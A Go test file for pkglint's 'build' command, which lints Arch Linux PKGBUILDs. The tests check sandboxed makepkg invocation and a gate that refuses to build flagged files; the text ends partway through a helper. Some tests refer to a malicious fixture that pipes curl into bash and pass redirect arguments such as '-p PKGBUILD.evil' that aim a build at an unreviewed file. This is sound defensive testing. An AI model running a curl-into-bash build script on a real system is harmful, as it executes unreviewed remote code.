package cli

import (
	"bytes"
	"debug/elf"
	"encoding/json"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/jmelahman/pkglint/internal/pkgfile/pkgtest"
)

// TestMain clears makepkg's destinations and pkglint's runtime selection out
// of the environment before any test runs. They are inputs to `pkglint build`,
// so a developer with PKGDEST or SRCDEST exported would otherwise watch the
// suite assert against their settings — and write its synthetic archives into
// their real package directory. Tests that need one set it with t.Setenv.
func TestMain(m *testing.M) {
	for _, key := range []string{
		"PKGDEST", "BUILDDIR", "LOGDEST", "SRCDEST", "SRCPKGDEST",
		"PKGLINT_BUILD_RUNNER", "PKGLINT_BUILD_IMAGE",
	} {
		os.Unsetenv(key)
	}
	os.Exit(m.Run())
}

// stubExec replaces the two process seams for one test: lookPath answers only
// for the named programs, and runCmd records what would have been executed
// instead of executing it. The returned pointer holds every command seen, in
// order — empty if the build never got that far.
func stubExec(t *testing.T, installed []string, run func(*exec.Cmd) error) *[]*exec.Cmd {
	t.Helper()
	origLook, origRun := lookPath, runCmd
	t.Cleanup(func() { lookPath, runCmd = origLook, origRun })

	lookPath = func(file string) (string, error) {
		if slices.Contains(installed, file) {
			return "/usr/bin/" + file, nil
		}
		return "", exec.ErrNotFound
	}
	var seen []*exec.Cmd
	runCmd = func(cmd *exec.Cmd) error {
		seen = append(seen, cmd)
		if run == nil {
			return nil
		}
		return run(cmd)
	}
	return &seen
}

// only returns the single command the test expected to be run.
func only(t *testing.T, seen []*exec.Cmd) *exec.Cmd {
	t.Helper()
	if len(seen) != 1 {
		t.Fatalf("ran %d commands, want 1: %v", len(seen), args(seen))
	}
	return seen[0]
}

// step returns the container command whose verb is word ("create", "cp", ...).
func step(t *testing.T, seen []*exec.Cmd, word string) *exec.Cmd {
	t.Helper()
	for _, cmd := range seen {
		if len(cmd.Args) > 1 && cmd.Args[1] == word {
			return cmd
		}
	}
	t.Fatalf("no %q step in %v", word, args(seen))
	return nil
}

func args(seen []*exec.Cmd) [][]string {
	var out [][]string
	for _, cmd := range seen {
		out = append(out, cmd.Args)
	}
	return out
}

// envValue reads a variable out of a command's environment, which is where the
// host build passes makepkg its redirected destinations. Scanned from the end,
// as os/exec resolves duplicates: pkglint appends its assignments to a copy of
// its own environment, so the last one is the one makepkg would see.
func envValue(cmd *exec.Cmd, key string) string {
	for i := len(cmd.Env) - 1; i >= 0; i-- {
		if name, value, ok := strings.Cut(cmd.Env[i], "="); ok && name == key {
			return value
		}
	}
	return ""
}

// dropArchive is a runCmd stub that plays makepkg: it writes a synthetic
// package archive into whatever PKGDEST the command was handed. The archive
// carries a world-writable file, a database-independent PB821.
func dropArchive(names ...string) func(*exec.Cmd) error {
	return func(cmd *exec.Cmd) error {
		dest := envValue(cmd, "PKGDEST")
		if dest == "" {
			return errors.New("no PKGDEST in the makepkg environment")
		}
		archive := pkgtest.Tar(pkgtest.Info("goodpkg", "any"),
			pkgtest.Member{Name: "usr/bin/goodpkg", Data: []byte("#!/bin/sh\necho hi\n"), Mode: 0o777})
		for _, name := range names {
			if err := os.WriteFile(filepath.Join(dest, name), archive, 0o644); err != nil {
				return err
			}
		}
		return nil
	}
}

// TestBuildHostCommand pins the host invocation: makepkg runs in the package
// directory, never installs dependencies on its own, and is redirected away
// from the package directory for everything it writes.
func TestBuildHostCommand(t *testing.T) {
	seen := stubExec(t, []string{"makepkg"}, dropArchive("goodpkg-2.1.0-1-any.pkg.tar"))

	var buf bytes.Buffer
	if code := run([]string{"build", "--fail-on=never", "testdata/clean"}, &buf); code != 0 {
		t.Fatalf("got exit %d, want 0\n%s", code, buf.String())
	}
	cmd := only(t, *seen)
	if got := filepath.Base(cmd.Path); got != "makepkg" {
		t.Errorf("ran %q, want makepkg", cmd.Path)
	}
	if cmd.Dir != "testdata/clean" {
		t.Errorf("ran in %q, want testdata/clean", cmd.Dir)
	}
	want := []string{"makepkg", "-f", "--noconfirm", "--cleanbuild", "--nosign"}
	if !slices.Equal(cmd.Args, want) {
		t.Errorf("args = %q, want %q", cmd.Args, want)
	}
	for _, key := range []string{"PKGDEST", "BUILDDIR", "LOGDEST"} {
		dir := envValue(cmd, key)
		if dir == "" {
			t.Errorf("%s is unset: makepkg would write into the package directory", key)
			continue
		}
		if abs, err := filepath.Abs("testdata/clean"); err == nil && strings.HasPrefix(dir, abs) {
			t.Errorf("%s=%q is inside the package directory", key, dir)
		}
	}
	// The source cache is deliberately not per-run: re-downloading every
	// tarball on every build makes the hook unusable.
	cache, err := os.UserCacheDir()
	if err != nil {
		t.Skip("no user cache directory on this host")
	}
	if got, want := envValue(cmd, "SRCDEST"), filepath.Join(cache, "pkglint", "sources"); got != want {
		t.Errorf("SRCDEST = %q, want %q", got, want)
	}
}

// TestBuildSrcdestEnv covers the escape hatch for the shared source cache.
func TestBuildSrcdestEnv(t *testing.T) {
	shared := t.TempDir()
	t.Setenv("SRCDEST", shared)
	seen := stubExec(t, []string{"makepkg"}, dropArchive("goodpkg-2.1.0-1-any.pkg.tar"))

	var buf bytes.Buffer
	run([]string{"build", "--fail-on=never", "testdata/clean"}, &buf)
	if got := envValue(only(t, *seen), "SRCDEST"); got != shared {
		t.Errorf("SRCDEST = %q, want the environment's %q", got, shared)
	}
}

// TestBuildBuilddirEnv covers the other configured destination pkglint gives
// way to: the per-run temporary root is under $TMPDIR, which is tmpfs on a
// stock Arch install and no place to compile a kernel.
func TestBuildBuilddirEnv(t *testing.T) {
	shared := t.TempDir()
	t.Setenv("BUILDDIR", shared)
	seen := stubExec(t, []string{"makepkg"}, dropArchive("goodpkg-2.1.0-1-any.pkg.tar"))

	var buf bytes.Buffer
	run([]string{"build", "--fail-on=never", "testdata/clean"}, &buf)
	if got := envValue(only(t, *seen), "BUILDDIR"); got != shared {
		t.Errorf("BUILDDIR = %q, want the environment's %q", got, shared)
	}
}

// TestBuildHoldsBuildFile: a PKGBUILD with a pkgver() function has makepkg
// rewrite its pkgver= and pkgrel= in place, editing the file the user is about
// to commit and building something other than what the gate reviewed. The host
// build makes it unwritable for the duration — what the container path gets
// from its read-only mount — and puts the mode back afterwards.
func TestBuildHoldsBuildFile(t *testing.T) {
	dir := t.TempDir()
	src, err := os.ReadFile("testdata/clean/PKGBUILD")
	if err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(dir, "PKGBUILD")
	if err := os.WriteFile(path, src, 0o644); err != nil {
		t.Fatal(err)
	}
	drop := dropArchive("goodpkg-2.1.0-1-any.pkg.tar")
	during := os.FileMode(0)
	stubExec(t, []string{"makepkg"}, func(cmd *exec.Cmd) error {
		fi, err := os.Stat(path)
		if err != nil {
			return err
		}
		during = fi.Mode().Perm()
		return drop(cmd)
	})

	var buf bytes.Buffer
	if code := run([]string{"build", "--fail-on=never", dir}, &buf); code != 0 {
		t.Fatalf("got exit %d, want 0\n%s", code, buf.String())
	}
	if during&0o222 != 0 {
		t.Errorf("PKGBUILD was mode %04o during the build: makepkg could rewrite it", during)
	}
	fi, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	if got := fi.Mode().Perm(); got != 0o644 {
		t.Errorf("PKGBUILD left at mode %04o, want 0644", got)
	}
}

// TestBuildMakepkgArgs checks both ways of reaching makepkg's own flags, and
// that they arrive in the documented order.
func TestBuildMakepkgArgs(t *testing.T) {
	seen := stubExec(t, []string{"makepkg"}, dropArchive("goodpkg-2.1.0-1-any.pkg.tar"))

	var buf bytes.Buffer
	code := run([]string{"build", "--fail-on=never", "--makepkg-arg=-s", "testdata/clean", "--", "--skipchecksums"}, &buf)
	if code != 0 {
		t.Fatalf("got exit %d, want 0\n%s", code, buf.String())
	}
	cmd := only(t, *seen)
	want := []string{"makepkg", "-f", "--noconfirm", "--cleanbuild", "--nosign", "-s", "--skipchecksums"}
	if !slices.Equal(cmd.Args, want) {
		t.Errorf("args = %q, want %q", cmd.Args, want)
	}
}

// TestBuildContainerCommand covers the container path: forced with --docker
// even though makepkg is installed, image-agnostic, mounting the package
// directory read-only so "the tree is left alone" is enforced rather than
// asserted, and getting the archives back out by copy rather than by a
// writable bind mount — the copy is client-side, so it works whatever uid the
// build ran as inside the container.
func TestBuildContainerCommand(t *testing.T) {
	if os.Getuid() == 0 {
		t.Skip("the container path refuses to run as root: makepkg would too")
	}
	for _, tc := range []struct {
		name      string
		installed []string
		runner    string
		args      []string
		wantRun   string
	}{
		{
			name:      "docker forced over an installed makepkg",
			installed: []string{"makepkg", "docker"},
			args:      []string{"--docker", "--image", "archlinux:base-devel"},
			wantRun:   "docker",
		},
		{
			name:      "podman named by the environment",
			installed: []string{"podman"},
			runner:    "podman",
			args:      []string{"--docker", "--image", "archlinux:base-devel"},
			wantRun:   "podman",
		},
		{
			name:      "no makepkg falls back to the configured image",
			installed: []string{"docker"},
			args:      nil,
			wantRun:   "docker",
		},
		{
			// $PKGLINT_BUILD_IMAGE is a fallback an installed makepkg wins
			// over; spelling --image is a request that has to be honoured, or
			// it silently does nothing on a developer's Arch box.
			name:      "an explicit --image implies a container build",
			installed: []string{"makepkg", "docker"},
			args:      []string{"--image", "archlinux:base-devel"},
			wantRun:   "docker",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if tc.runner != "" {
				t.Setenv("PKGLINT_BUILD_RUNNER", tc.runner)
			}
			t.Setenv("PKGLINT_BUILD_IMAGE", "archlinux:base-devel")
			drop := dropArchive("goodpkg-2.1.0-1-any.pkg.tar")
			seen := stubExec(t, tc.installed, func(cmd *exec.Cmd) error {
				if cmd.Args[1] == "cp" {
					// Stand in for the extraction, into its destination.
					return drop(&exec.Cmd{Env: []string{"PKGDEST=" + cmd.Args[len(cmd.Args)-1]}})
				}
				return nil
			})

			var buf bytes.Buffer
			args := append([]string{"build", "--fail-on=never"}, tc.args...)
			if code := run(append(args, "testdata/clean"), &buf); code != 0 {
				t.Fatalf("got exit %d, want 0\n%s", code, buf.String())
			}

			create := step(t, *seen, "create")
			if got := filepath.Base(create.Path); got != tc.wantRun {
				t.Errorf("ran %q, want %q", create.Path, tc.wantRun)
			}
			abs, _ := filepath.Abs("testdata/clean")
			joined := strings.Join(create.Args, " ")
			for _, want := range []string{
				"--user", "-e HOME=/tmp", "-w /build",
				// --mount, not -v: its key=value list has no ambiguity with a
				// path containing a colon.
				"--mount type=bind,source=" + abs + ",target=/build,readonly",
				"-e PKGDEST=/tmp/out", "-e BUILDDIR=/tmp/build", "-e SRCDEST=/tmp/src",
				"archlinux:base-devel makepkg -f --noconfirm --cleanbuild --nosign",
			} {
				if !strings.Contains(joined, want) {
					t.Errorf("missing %q in: %s", want, joined)
				}
			}
			// Exactly one mount, and it is the read-only source tree: every
			// destination makepkg writes to stays inside the container.
			if n := strings.Count(joined, " --mount ") + strings.Count(joined, " -v "); n != 1 {
				t.Errorf("%d bind mounts, want only the read-only package directory: %s", n, joined)
			}

			// The container is addressed by a name chosen before `create`
			// runs, not by the id it prints, so the removal below is
			// registered first and survives a create that fails part way.
			name := flagValue(t, create, "--name")
			start := step(t, *seen, "start")
			if want := []string{tc.wantRun, "start", "--attach", name}; !slices.Equal(start.Args, want) {
				t.Errorf("start = %q, want %q", start.Args, want)
			}
			cp := step(t, *seen, "cp")
			if got := cp.Args[2]; got != name+":/tmp/out/." {
				t.Errorf("copied from %q, want %q", got, name+":/tmp/out/.")
			}
			// The container is not started with --rm, so it has to be removed.
			rm := step(t, *seen, "rm")
			if want := []string{tc.wantRun, "rm", "--force", name}; !slices.Equal(rm.Args, want) {
				t.Errorf("rm = %q, want %q", rm.Args, want)
			}
		})
	}
}

// TestBuildContainerCleansUpOnFailure pins the leak this flow is easiest to
// get wrong: a `create` that fails after the container exists still has to
// remove it, which only works because the name is known up front.
func TestBuildContainerCleansUpOnFailure(t *testing.T) {
	if os.Getuid() == 0 {
		t.Skip("the container path refuses to run as root: makepkg would too")
	}
	seen := stubExec(t, []string{"docker"}, func(cmd *exec.Cmd) error {
		if cmd.Args[1] == "create" {
			return errors.New("exit status 125")
		}
		return nil
	})

	var buf bytes.Buffer
	if code := run([]string{"build", "--image", "archlinux:base-devel", "testdata/clean"}, &buf); code != 1 {
		t.Fatalf("got exit %d, want 1\n%s", code, buf.String())
	}
	create := step(t, *seen, "create")
	rm := step(t, *seen, "rm")
	if want := []string{"docker", "rm", "--force", flagValue(t, create, "--name")}; !slices.Equal(rm.Args, want) {
		t.Errorf("rm = %q, want %q", rm.Args, want)
	}
}

// flagValue returns the argument following name in a command line.
func flagValue(t *testing.T, cmd *exec.Cmd, name string) string {
	t.Helper()
	for i, a := range cmd.Args {
		if a == name && i+1 < len(cmd.Args) {
			return cmd.Args[i+1]
		}
	}
	t.Fatalf("no %s in %q", name, cmd.Args)
	return ""
}

// TestBuildRunnerErrors covers the two ways there is nothing to build with.
func TestBuildRunnerErrors(t *testing.T) {
	for _, tc := range []struct {
		name      string
		installed []string
		args      []string
		want      string
	}{
		{
			name:      "--docker without an image",
			installed: []string{"makepkg", "docker"},
			args:      []string{"--docker"},
			want:      "--docker needs an image",
		},
		{
			name:      "no makepkg and no image",
			installed: nil,
			want:      "makepkg not found",
		},
		{
			name:      "an image but no runtime",
			installed: nil,
			args:      []string{"--docker", "--image", "archlinux:base-devel"},
			want:      "no container runtime",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Setenv("PKGLINT_BUILD_IMAGE", "")
			seen := stubExec(t, tc.installed, nil)

			var buf bytes.Buffer
			cmdline := append([]string{"build"}, tc.args...)
			if code := run(append(cmdline, "testdata/clean"), &buf); code != 1 {
				t.Fatalf("got exit %d, want 1\n%s", code, buf.String())
			}
			if len(*seen) > 0 {
				t.Errorf("something was executed: %v", args(*seen))
			}
			if !strings.Contains(buf.String(), tc.want) {
				t.Errorf("expected %q in:\n%s", tc.want, buf.String())
			}
		})
	}
}

// TestBuildRefusesFindings is the invariant this command lives or dies by:
// a PKGBUILD whose static findings reach the threshold is never executed.
func TestBuildRefusesFindings(t *testing.T) {
	seen := stubExec(t, []string{"makepkg"}, dropArchive("badpkg-1.0-1-any.pkg.tar"))

	var buf bytes.Buffer
	if code := run([]string{"build", "testdata/malicious"}, &buf); code != 1 {
		t.Fatalf("got exit %d, want 1\n%s", code, buf.String())
	}
	if len(*seen) > 0 {
		t.Fatalf("makepkg ran on a PKGBUILD that pipes curl into bash: %v", args(*seen))
	}
	out := buf.String()
	if !strings.Contains(out, "build refused") || !strings.Contains(out, "--force") {
		t.Errorf("expected a refusal naming its override, got:\n%s", out)
	}
	if !strings.Contains(out, "PB304") {
		t.Errorf("expected the static findings alongside the refusal, got:\n%s", out)
	}

	// --fail-on is a statement about exit codes, not about what is safe to
	// execute: "never" still stops at a critical finding — and a build that
	// never ran is an operational failure, not a finding, so it still exits
	// non-zero.
	buf.Reset()
	if code := run([]string{"build", "--fail-on=never", "testdata/malicious"}, &buf); code != 1 {
		t.Errorf("--fail-on=never: got exit %d, want 1\n%s", code, buf.String())
	}
	if len(*seen) > 0 {
		t.Fatalf("--fail-on=never let a critical PKGBUILD build: %v", args(*seen))
	}
	if !strings.Contains(buf.String(), "build refused") {
		t.Errorf("--fail-on=never should still refuse, got:\n%s", buf.String())
	}

	// The refusal is a report, so machine consumers see it too.
	buf.Reset()
	run([]string{"build", "--format=json", "testdata/malicious"}, &buf)
	var payload []struct {
		Err string `json:"error"`
	}
	if err := json.Unmarshal(buf.Bytes(), &payload); err != nil {
		t.Fatalf("--format=json: %v\n%s", err, buf.String())
	}
	refused := false
	for _, p := range payload {
		if strings.Contains(p.Err, "build refused") {
			refused = true
		}
	}
	if !refused {
		t.Errorf("no refusal in the json report:\n%s", buf.String())
	}

	// --force overrides the gate but not the exit code: the findings stand.
	buf.Reset()
	if code := run([]string{"build", "--force", "testdata/malicious"}, &buf); code != 1 {
		t.Errorf("--force: got exit %d, want 1\n%s", code, buf.String())
	}
	if len(*seen) == 0 {
		t.Error("--force did not reach makepkg")
	}
}

// TestBuildIgnoresInlineSuppressions closes the loop `pkglint --add-ignores`
// would otherwise open: a PKGBUILD annotated with directives that suppress
// every one of its findings lints clean, and must still not be executed. The
// gate reads the unsuppressed set precisely so a file cannot vouch for itself.
func TestBuildIgnoresInlineSuppressions(t *testing.T) {
	dir := t.TempDir()
	for _, name := range []string{"PKGBUILD", "badpkg.install"} {
		data, err := os.ReadFile(filepath.Join("testdata/malicious", name))
		if err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, name), data, 0o644); err != nil {
			t.Fatal(err)
		}
	}
	var buf bytes.Buffer
	if code := run([]string{"--add-ignores", dir}, &buf); code != 0 {
		t.Fatalf("--add-ignores: got exit %d\n%s", code, buf.String())
	}
	buf.Reset()
	if code := run([]string{"--fail-on=never", dir}, &buf); !strings.Contains(buf.String(), "1 clean") {
		t.Fatalf("--add-ignores left findings behind (exit %d), so this proves nothing:\n%s", code, buf.String())
	}

	seen := stubExec(t, []string{"makepkg"}, dropArchive("badpkg-1.0-1-any.pkg.tar"))
	buf.Reset()
	if code := run([]string{"build", dir}, &buf); code != 1 {
		t.Fatalf("got exit %d, want 1\n%s", code, buf.String())
	}
	if len(*seen) > 0 {
		t.Fatalf("an annotated PKGBUILD talked its way past the gate: %v", args(*seen))
	}
	if !strings.Contains(buf.String(), "build refused") {
		t.Errorf("expected a refusal, got:\n%s", buf.String())
	}
	// The report itself still honours the directives: only the decision to
	// execute is taken on the unsuppressed set.
	if strings.Contains(buf.String(), "PB304") {
		t.Errorf("the report should still respect the file's directives, got:\n%s", buf.String())
	}
}

// TestBuildSelectNarrowsGate: --select is the operator's choice, like --ignore,
// so the gate reads only the selected rules. The curl|bash fixture built under
// --select=PB908 (the missing-maintainer nit) has nothing to refuse and runs,
// and the artifact is held to the same selection. A typo in the selection is
// refused before makepkg is spent on it.
func TestBuildSelectNarrowsGate(t *testing.T) {
	seen := stubExec(t, []string{"makepkg"}, dropArchive("badpkg-1.0-1-any.pkg.tar"))
	var buf bytes.Buffer
	if code := run([]string{"build", "--select=PB908", "testdata/malicious"}, &buf); code != 0 {
		t.Fatalf("got exit %d, want 0\n%s", code, buf.String())
	}
	if len(*seen) == 0 {
		t.Fatal("--select left a gating rule in place: makepkg never ran")
	}
	out := buf.String()
	if !strings.Contains(out, "PB908") || strings.Contains(out, "PB304") {
		t.Errorf("the static report should hold PB908 alone, got:\n%s", out)
	}
	if strings.Contains(out, "PB821") {
		t.Errorf("the archive's world-writable file is outside the selection, got:\n%s", out)
	}

	*seen = nil
	buf.Reset()
	if code := run([]string{"build", "--select=PB999", "testdata/malicious"}, &buf); code != 2 {
		t.Errorf("--select=PB999: got exit %d, want 2\n%s", code, buf.String())
	}
	if len(*seen) > 0 {
		t.Fatalf("an unknown --select reached makepkg: %v", args(*seen))
	}
}

// TestBuildReportsStaleIgnores is the other half of the previous test: the
// gate disregards the file's directives, but the report must not be a filtered
// copy of that unsuppressed run. PB913 (stale ignore directive) exists only
// when directives are honoured, so a filter could never surface it and
// `pkglint build` would silently switch off the one rule that audits the
// suppression trail.
func TestBuildReportsStaleIgnores(t *testing.T) {
	stubExec(t, []string{"makepkg"}, dropArchive("suppressed-1.0.0-1-x86_64.pkg.tar"))
	var buf bytes.Buffer
	run([]string{"build", "--fail-on=never", "testdata/suppressed"}, &buf)
	if !strings.Contains(buf.String(), "PB913") {
		t.Errorf("the stale `ignore=PB203` directive went unreported:\n%s", buf.String())
	}
	// The honoured directive still suppresses its finding on this path.
	if strings.Contains(buf.String(), "PB204") {
		t.Errorf("the report should still respect the file's directives, got:\n%s", buf.String())
	}
}

// TestBuildRefusesUnbuiltFile covers the other way to gate one file and run
// another: makepkg builds ./PKGBUILD in its working directory, so a file
// argument that is not a PKGBUILD would be linted and then ignored.
func TestBuildRefusesUnbuiltFile(t *testing.T) {
	dir := t.TempDir()
	clean, err := os.ReadFile("testdata/clean/PKGBUILD")
	if err != nil {
		t.Fatal(err)
	}
	malicious, err := os.ReadFile("testdata/malicious/PKGBUILD")
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD.reviewed"), clean, 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), malicious, 0o644); err != nil {
		t.Fatal(err)
	}
	seen := stubExec(t, []string{"makepkg"}, dropArchive("badpkg-1.0-1-any.pkg.tar"))

	var buf bytes.Buffer
	if code := run([]string{"build", filepath.Join(dir, "PKGBUILD.reviewed")}, &buf); code != 1 {
		t.Fatalf("got exit %d, want 1\n%s", code, buf.String())
	}
	if len(*seen) > 0 {
		t.Fatalf("linting one file built another: %v", args(*seen))
	}
	if !strings.Contains(buf.String(), "refusing to build") {
		t.Errorf("expected a refusal naming the file makepkg would build, got:\n%s", buf.String())
	}
}

// TestBuildRefusesBuildfileArgs covers the third route to the same place:
// makepkg's own -p/-D repoint the build at a file pkglint never saw.
func TestBuildRefusesBuildfileArgs(t *testing.T) {
	for _, tc := range [][]string{
		{"build", "testdata/clean", "--", "-p", "PKGBUILD.evil"},
		{"build", "--makepkg-arg=-p", "--makepkg-arg=PKGBUILD.evil", "testdata/clean"},
		{"build", "testdata/clean", "--", "--dir=/elsewhere"},
		{"build", "testdata/clean", "--", "-sp", "PKGBUILD.evil"},
	} {
		seen := stubExec(t, []string{"makepkg"}, dropArchive("goodpkg-2.1.0-1-any.pkg.tar"))
		var buf bytes.Buffer
		if code := run(tc, &buf); code != 2 {
			t.Errorf("%q: got exit %d, want 2\n%s", tc, code, buf.String())
		}
		if len(*seen) > 0 {
			t.Errorf("%q reached makepkg: %v", tc, args(*seen))
		}
	}
}

// TestBuildAmbiguousGlob covers `pkglint *` in a tree holding a ./build
// package directory: the shell hands cobra `build <the rest>`, which would
// otherwise execute every other path on the line and never lint ./build.
func TestBuildAmbiguousGlob(t *testing.T) {
	dir := t.TempDir()
	clean, err := os.ReadFile("testdata/clean/PKGBUILD")
	if err != nil {
		t.Fatal(err)
	}
	for _, base := range []string{"build", "mypkg"} {
		if err := os.Mkdir(filepath.Join(dir, base), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, base, "PKGBUILD"), clean, 0o644); err != nil {
			t.Fatal(err)
		}
	}
	t.Chdir(dir)
	seen := stubExec(t, []string{"makepkg"}, dropArchive("goodpkg-2.1.0-1-any.pkg.tar"))

	var buf bytes.Buffer
	if code := run([]string{"build", "mypkg"}, &buf); code != 2 {
		t.Fatalf("got exit %d, want 2\n%s", code, buf.String())
	}
	if len(*seen) > 0 {
		t.Fatalf("a glob that meant `lint everything` built something: %v", args(*seen))
	}

	// Only a shell glob's own shape is caught: a path spelled out is a
	// deliberate build, and naming ./build says the verb was meant.
	if code := run([]string{"build", "--fail-on=never", "./mypkg"}, &buf); code != 0 {
		t.Fatalf("an explicit ./mypkg: got exit %d\n%s", code, buf.String())
	}
	if code := run([]string{"build", "--fail-on=never", "build", "mypkg"}, &buf); code != 0 {
		t.Fatalf("naming ./build: got exit %d\n%s", code, buf.String())
	}
	if len(*seen) != 3 {
		t.Errorf("ran %d builds, want 3: %v", len(*seen), args(*seen))
	}
}

// TestBuildFailOnNeverStillFails: --fail-on grades findings, not whether the
// command did its job. A makepkg that exits non-zero is not a finding.
func TestBuildFailOnNeverStillFails(t *testing.T) {
	stubExec(t, []string{"makepkg"}, func(*exec.Cmd) error { return errors.New("exit status 4") })

	var buf bytes.Buffer
	if code := run([]string{"build", "--fail-on=never", "testdata/clean"}, &buf); code != 1 {
		t.Fatalf("got exit %d, want 1\n%s", code, buf.String())
	}
}

// TestCollectArchivesSkipsSidecars: IsPackagePath is a name test, and the
// files makepkg leaves beside an archive wear the archive's name plus a
// suffix. Linting a detached signature as if it were a package fails the run.
func TestCollectArchivesSkipsSidecars(t *testing.T) {
	pkgdest := t.TempDir()
	archive := "goodpkg-2.1.0-1-any.pkg.tar.zst"
	for _, name := range []string{archive, archive + ".sig", archive + ".part", "build.log"} {
		if err := os.WriteFile(filepath.Join(pkgdest, name), []byte("x"), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.Mkdir(filepath.Join(pkgdest, "sub.pkg.tar.zst"), 0o755); err != nil {
		t.Fatal(err)
	}
	got, err := collectArchives(pkgdest, "")
	if err != nil {
		t.Fatal(err)
	}
	want := []string{filepath.Join(pkgdest, archive)}
	if !slices.Equal(got, want) {
		t.Errorf("collectArchives = %q, want %q", got, want)
	}
}

// TestBuildLintsArtifacts is the whole point: the archive makepkg produced is
// linted with the built-package rules, which no amount of reading the PKGBUILD
// could have answered.
func TestBuildLintsArtifacts(t *testing.T) {
	seen := stubExec(t, []string{"makepkg"},
		dropArchive("goodpkg-2.1.0-1-any.pkg.tar", "goodpkg-debug-2.1.0-1-any.pkg.tar"))

	var buf bytes.Buffer
	if code := run([]string{"build", "testdata/clean"}, &buf); code != 1 {
		t.Fatalf("a world-writable file should fail the run: got exit %d\n%s", code, buf.String())
	}
	out := buf.String()
	if !strings.Contains(out, "PB821") || !strings.Contains(out, "world-writable") {
		t.Errorf("expected the built-package rules to run, got:\n%s", out)
	}
	// Both archives makepkg emitted are linted, plus the PKGBUILD itself.
	if !strings.Contains(out, "3 packages linted") {
		t.Errorf("expected the PKGBUILD and both archives in the summary, got:\n%s", out)
	}
	// Nothing survives the run: the temporary tree is gone.
	pkgdest := envValue(only(t, *seen), "PKGDEST")
	if _, err := os.Stat(pkgdest); !os.IsNotExist(err) {
		t.Errorf("PKGDEST %q outlived the build (err=%v)", pkgdest, err)
	}
}

// TestBuildKeep copies the artifacts out, and lints them where they landed so
// the reported paths outlive the run.
func TestBuildKeep(t *testing.T) {
	keep := filepath.Join(t.TempDir(), "out")
	stubExec(t, []string{"makepkg"}, dropArchive("goodpkg-2.1.0-1-any.pkg.tar"))

	var buf bytes.Buffer
	run([]string{"build", "--fail-on=never", "--keep", keep, "testdata/clean"}, &buf)
	kept := filepath.Join(keep, "goodpkg-2.1.0-1-any.pkg.tar")
	if _, err := os.Stat(kept); err != nil {
		t.Fatalf("--keep did not copy the archive out: %v", err)
	}
	if !strings.Contains(buf.String(), "PB821") {
		t.Errorf("the kept archive should still be linted, got:\n%s", buf.String())
	}
}

// TestBuildFailures covers the two ways a build produces nothing to lint.
func TestBuildFailures(t *testing.T) {
	t.Run("makepkg exits non-zero", func(t *testing.T) {
		stubExec(t, []string{"makepkg"}, func(*exec.Cmd) error {
			return errors.New("exit status 4")
		})
		var buf bytes.Buffer
		if code := run([]string{"build", "testdata/clean"}, &buf); code != 1 {
			t.Fatalf("got exit %d, want 1\n%s", code, buf.String())
		}
		if !strings.Contains(buf.String(), "makepkg") {
			t.Errorf("expected the build failure in the report, got:\n%s", buf.String())
		}
	})

	t.Run("no archives", func(t *testing.T) {
		stubExec(t, []string{"makepkg"}, nil)
		var buf bytes.Buffer
		if code := run([]string{"build", "testdata/clean"}, &buf); code != 1 {
			t.Fatalf("got exit %d, want 1\n%s", code, buf.String())
		}
		if !strings.Contains(buf.String(), "no package archives") {
			t.Errorf("a silent no-op is not a pass, got:\n%s", buf.String())
		}
	})
}

// TestBuildBadInput covers the paths that never reach a build: an unreadable
// package directory, an archive that is already built, and flags that would
// only fail after a full makepkg run.
func TestBuildBadInput(t *testing.T) {
	seen := stubExec(t, []string{"makepkg"}, nil)

	var buf bytes.Buffer
	if code := run([]string{"build", filepath.Join(t.TempDir(), "nope")}, &buf); code != 1 {
		t.Errorf("missing package: got exit %d, want 1\n%s", code, buf.String())
	}

	buf.Reset()
	if code := run([]string{"build", "demo-1.0-1-any.pkg.tar.zst"}, &buf); code != 1 {
		t.Errorf("built package: got exit %d, want 1\n%s", code, buf.String())
	}
	if !strings.Contains(buf.String(), "already a built package") {
		t.Errorf("expected a redirect to plain linting, got:\n%s", buf.String())
	}

	for _, flag := range []string{"--fail-on=sometimes", "--format=yaml", "--color=sometimes"} {
		buf.Reset()
		if code := run([]string{"build", flag, "testdata/clean"}, &buf); code != 2 {
			t.Errorf("%s: got exit %d, want 2\n%s", flag, code, buf.String())
		}
	}
	if len(*seen) > 0 {
		t.Errorf("a bad flag cost a build: %v", args(*seen))
	}
}

// TestBuildIsNotAPath documents the one word the root command can no longer
// treat as a package directory, and the spelling that gets it back.
func TestBuildIsNotAPath(t *testing.T) {
	dir := t.TempDir()
	if err := os.Mkdir(filepath.Join(dir, "build"), 0o755); err != nil {
		t.Fatal(err)
	}
	pkgbuild, err := os.ReadFile("testdata/clean/PKGBUILD")
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "build", "PKGBUILD"), pkgbuild, 0o644); err != nil {
		t.Fatal(err)
	}
	seen := stubExec(t, []string{"makepkg"}, dropArchive("goodpkg-2.1.0-1-any.pkg.tar"))

	var buf bytes.Buffer
	if code := run([]string{"--fail-on=never", filepath.Join(dir, "build")}, &buf); code != 0 {
		t.Fatalf("linting a ./build directory: got exit %d\n%s", code, buf.String())
	}
	if len(*seen) > 0 {
		t.Errorf("linting a path named build started a build: %v", args(*seen))
	}
	if !strings.Contains(buf.String(), "1 package linted") {
		t.Errorf("expected a lint report, got:\n%s", buf.String())
	}
}

// --- build --fix -------------------------------------------------------------

// glibcDB writes a one-package pacman local database: glibc, shipping
// usr/lib/libc.so.6. It is the smallest thing PB809 can resolve a soname
// against, and stubbing localDBRoot at it is what lets the dependency rules
// run on a host that is not Arch.
func glibcDB(t *testing.T) {
	t.Helper()
	root := t.TempDir()
	dir := filepath.Join(root, "glibc-2.38-1")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	desc := "%NAME%\nglibc\n\n%VERSION%\n2.38-1\n\n%PROVIDES%\nlibc.so=6-64\n"
